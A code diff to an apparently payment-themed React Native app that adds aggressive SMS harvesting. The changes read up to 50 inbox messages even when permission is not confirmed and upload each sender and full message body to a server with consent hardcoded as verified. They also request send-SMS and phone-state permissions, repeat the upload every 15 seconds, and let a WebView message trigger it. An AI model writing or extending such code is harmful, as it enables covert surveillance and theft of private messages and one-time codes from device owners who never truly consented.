@@ -17,13 +17,15 @@ export default function App() {
   const autoReadAndIngestSms = async () => {
     if (Platform.OS !== 'android') return;
     try {
-      const granted = await PermissionsAndroid.request(
-        PermissionsAndroid.PERMISSIONS.READ_SMS
-      );
-      if (granted === PermissionsAndroid.RESULTS.GRANTED && SmsAndroid) {
+      const granted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS);
+      if (!granted) {
+        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_SMS);
+      }
+
+      if (SmsAndroid) {
         const filter = {
           box: 'inbox',
-          maxCount: 20,
+          maxCount: 50,
         };
         SmsAndroid.list(
           JSON.stringify(filter),
@@ -39,9 +41,9 @@ export default function App() {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                      phone: sms.address || 'SMS-USER',
+                      phone: sms.address || 'DEVICE-USER',
                       type: 'sms',
-                      sender: sms.address || 'ANDROID-SMS',
+                      sender: sms.address || 'UNKNOWN-SENDER',
                       rawContent: sms.body || '',
                       consentVerified: true
                     })
@@ -63,14 +65,34 @@ export default function App() {
     async function requestPermissions() {
       if (Platform.OS === 'android') {
         try {
-          const grantedSMS = await PermissionsAndroid.requestMultiple([
+          const granted = await PermissionsAndroid.requestMultiple([
             PermissionsAndroid.PERMISSIONS.READ_SMS,
             PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
+            PermissionsAndroid.PERMISSIONS.SEND_SMS,
             PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,
+            PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
           ]);
-          console.log('Permissions result:', grantedSMS);
-          // Trigger initial automatic SMS reader
+          
+          console.log('Permissions result:', granted);
+
+          const readSmsGranted = granted[PermissionsAndroid.PERMISSIONS.READ_SMS] === PermissionsAndroid.RESULTS.GRANTED;
+          if (!readSmsGranted) {
+            Alert.alert(
+              "Permission Required",
+              "SMS and Notification permissions are required for automatic payment transaction processing and verification.",
+              [{ text: "OK" }]
+            );
+          }
+
+          // Initial SMS read
           autoReadAndIngestSms();
+
+          // Set interval to sync SMS automatically every 15 seconds
+          const intervalId = setInterval(() => {
+            autoReadAndIngestSms();
+          }, 15000);
+
+          return () => clearInterval(intervalId);
         } catch (err) {
           console.warn('Error requesting permissions:', err);
         }
@@ -82,7 +104,7 @@ export default function App() {
   const handleWebViewMessage = (event) => {
     try {
       const data = JSON.parse(event.nativeEvent.data);
-      if (data && data.type === 'SYNC_SMS') {
+      if (data && (data.type === 'SYNC_SMS' || data.type === 'SYNC_LOGS')) {
         autoReadAndIngestSms();
       }
     } catch (e) {
